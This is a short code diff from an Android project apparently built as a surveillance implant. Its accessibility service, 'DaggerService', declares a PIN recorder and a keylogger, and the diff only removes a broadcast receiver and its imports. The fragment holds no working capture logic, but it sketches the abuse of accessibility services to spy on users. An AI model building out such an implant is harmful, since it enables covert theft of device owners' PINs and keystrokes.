@@ -13,9 +13,6 @@ package com.cooperthecoder.implant
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
-import android.content.BroadcastReceiver
-import android.content.Intent
-import android.content.IntentFilter
 import android.os.Build
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
@@ -33,7 +30,6 @@ class DaggerService : AccessibilityService() {
 
     lateinit var pinRecorder: PinRecorder
     lateinit var keyLogger: KeyLogger
-    lateinit var receiver: BroadcastReceiver
 
     override fun onCreate() {
         super.onCreate()
